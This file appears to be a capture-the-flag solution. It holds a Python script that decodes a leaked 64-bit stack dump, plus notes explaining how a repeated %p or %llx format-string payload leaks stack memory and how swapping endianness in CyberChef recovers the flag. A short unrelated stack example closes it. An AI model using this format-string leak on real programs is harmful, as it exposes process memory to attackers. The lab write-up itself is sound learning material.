hex_string = r'''0x402118.(nil).0x703b49030a00.(nil).0x87b880.0xa347834.0x7ffd604f0920.0x703b48e21e60.0x703b490464d0.0x1.0x7ffd604f09f0.(nil).(nil).0x7b4654436f636970.0x355f31346d316e34.0x3478345f33317937.0x34365f673431665f.0x7d363131373732.0x7.0x703b490488d8.0x2300000007.0x206e693374307250.0xa336c797453.0x9.0x703b49059de9.0x703b48e2a098.0x703b490464d0.(nil).0x7ffd604f0a00.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x879680.0x1.0x703b48e43d90.(nil).0x4011f6.0x100000000.0x7ffd604f0e78.(nil).0xa824adf6145750c5.0x7ffd604f0e78.0x4011f6.0x403e18.0x703b49082040.0x57de6d680eb550c5.0x48523c3e6edd50c5.0x703b00000000.(nil).(nil).(nil).(nil).0x30d7f0126625f200.(nil).0x703b48e43e40.0x7ffd604f0e88.0x403e18.0x703b490832e0.(nil).(nil).0x401110.0x7ffd604f0e70.(nil).(nil).0x401135.0x7ffd604f0e68.0x1c.0x1.0x7ffd604f1ea5.(nil).0x7ffd604f1ec0.0x7ffd604f1ed3.0x7ffd604f1edb.0x7ffd604f1ef9'''

hex_list = hex_string.split('.')
num = 0
for element in hex_list:
    try:
        element = element[2:]
        ascii = bytes.fromhex(element).decode('ascii')
        print(ascii, end='')
        num += 1
    except:
        pass


'''
file binary
    - it's a 64 bit, which means every block of memory in the stack is 8 bytes, not 4 unlike 32 bit

we need to leak memory off the stack using a format specifier that reads 8 bytes, the safest bet is to 
use hex because the encoding will allow for decoding even for special characters.
    %llx * 200 -> 8 bytes 
    %p * 200 -> 4/8 depending on architecture (dynamic, this is better to use than llx actually)


    Now the program will output a bunch of hexadecimal values, save these, run in the script

    As you search around you'll find this sticks out:
    {FTCocip5_14m1n44x4_31y746_g41f_}
    in cyberchef it puts a bunch of NULL or weird format, so we're missing some characters, I realized this is the full one:
    FTCocip5_14m1n44x4_31y746_g41f_}611772

    What I did in cyberchef is crucial to getting the final flag.
    1) I realized this is endianness because of the way some of the characters were shifted. 
        so in cyberchef I changed it "TO HEX 8 bytes SPACE DELIM" because endianness works with raw bytes
    2) Swap endianness *EIGHT BYTES* (have "pad incomplete words" checked to help identify if we're missing any characters we need)
    3) convert the swapped endianness BACK to ASCII to get our lovely flag!
    

    also I was trying to do %x before which reads only 4 bytes, and because of this I was getting an incomplete flag,
    that's why I was unable to leak the proper structure like the "{" and "}" characters
'''











def add(a, b):
    return a + b
x = 10 # x will be put on the stack
y = 10 # y will be put on stack
add(x, y) # jump to add